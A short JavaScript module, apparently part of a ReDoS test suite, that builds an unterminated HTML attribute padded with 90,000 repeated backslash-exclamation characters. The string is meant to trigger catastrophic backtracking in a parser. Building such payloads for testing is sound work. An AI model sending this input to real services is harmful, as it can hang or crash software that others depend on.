function getPayload() {
    const genstr = require("../utils").genstr;
    const attack_str = '<a foobar="foo' + genstr(90000, "\\!") + "/>";
    return { attack_str };
}

module.exports = { getPayload };